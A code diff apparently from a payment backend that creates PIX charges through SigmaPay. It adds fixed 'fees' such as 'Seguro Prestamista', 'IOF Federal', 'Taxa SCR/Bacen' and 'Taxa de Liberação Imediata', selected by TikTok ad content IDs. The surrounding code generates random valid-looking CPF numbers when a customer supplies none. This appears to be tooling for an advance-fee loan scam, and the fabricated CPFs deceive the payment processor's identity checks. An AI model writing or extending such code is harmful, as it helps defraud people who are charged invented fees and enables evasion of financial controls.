@@ -8,6 +8,15 @@ const corsHeaders = {
 
 const SIGMAPAY_BASE_URL = 'https://api.sigmapay.com.br/api/public/v1';
 
+const PAYMENT_ITEMS: Record<string, { title: string; value: number }> = {
+  seguro_prestamista: { title: 'Seguro Prestamista', value: 5279 },
+  taxa_transferencia: { title: 'Taxa de Transferência', value: 2874 },
+  iof_federal: { title: 'IOF Federal', value: 2490 },
+  taxa_scr_bacen: { title: 'Taxa SCR/Bacen', value: 2990 },
+  taxa_liberacao_imediata: { title: 'Taxa de Liberação Imediata', value: 3290 },
+  seguro_antifraude: { title: 'Seguro Antifraude', value: 3690 },
+};
+
 const onlyDigits = (v: unknown) => (typeof v === 'string' ? v.replace(/\D/g, '') : '');
 
 // Generate a valid random CPF (with correct check digits)
@@ -60,7 +69,11 @@ serve(async (req) => {
     const { value, customer, tiktok } = body || {};
     console.log('create-pix received customer:', JSON.stringify(customer));
 
-    if (!value || typeof value !== 'number' || value < 50) {
+    const contentId = typeof tiktok?.content_id === 'string' ? tiktok.content_id : '';
+    const paymentItem = PAYMENT_ITEMS[contentId];
+    const finalValue = paymentItem?.value ?? value;
+
+    if (!finalValue || typeof finalValue !== 'number' || finalValue < 50) {
       return new Response(JSON.stringify({ error: 'Value must be at least 50 centavos' }), {
         status: 400,
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
@@ -87,7 +100,7 @@ serve(async (req) => {
 
     console.log('create-pix using customer:', JSON.stringify({ name: customerName, email: customerEmail, phone: phoneDigits, cpf: cpfDigits, randomized: !realCpf }));
 
-    const itemTitle = value > 2000 ? 'Seguro Prestamista' : 'Taxa de Transferência';
+    const itemTitle = paymentItem?.title || (finalValue > 2000 ? 'Seguro Prestamista' : 'Taxa de Transferência');
 
     // SigmaPay payload format
     const payload = {
@@ -95,7 +108,7 @@ serve(async (req) => {
       offer_hash: SIGMAPAY_OFFER_HASH,
       payment_method: 'pix',
       installments: 1,
-      amount: value,
+      amount: finalValue,
       customer: {
         name: customerName,
         email: customerEmail,
@@ -113,7 +126,7 @@ serve(async (req) => {
         {
           product_hash: SIGMAPAY_PRODUCT_HASH,
           title: itemTitle,
-          price: value,
+          price: finalValue,
           quantity: 1,
           operation_type: 1,
           tangible: false,
@@ -163,7 +176,7 @@ serve(async (req) => {
     await supabaseAdmin.from('pix_payments').upsert({
       transaction_id: transactionHash,
       status: 'created',
-      value: value,
+      value: finalValue,
       hashed_email: tiktok?.hashed_email || null,
       hashed_phone: tiktok?.hashed_phone || null,
       hashed_external_id: tiktok?.hashed_external_id || null,
@@ -180,7 +193,7 @@ serve(async (req) => {
 
     // Pushcut notification
     try {
-      const valueInReais = (value / 100).toFixed(2).replace('.', ',');
+      const valueInReais = (finalValue / 100).toFixed(2).replace('.', ',');
       await fetch('https://api.pushcut.io/Ee028sYTepada_oEeEk6n/notifications/MinhaNotifica%C3%A7%C3%A3o', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -198,7 +211,7 @@ serve(async (req) => {
       id: transactionHash,
       qr_code: qrCode,
       qr_code_base64: qrCodeBase64,
-      value: value,
+      value: finalValue,
       status: 'created',
       raw: json,
     }), {
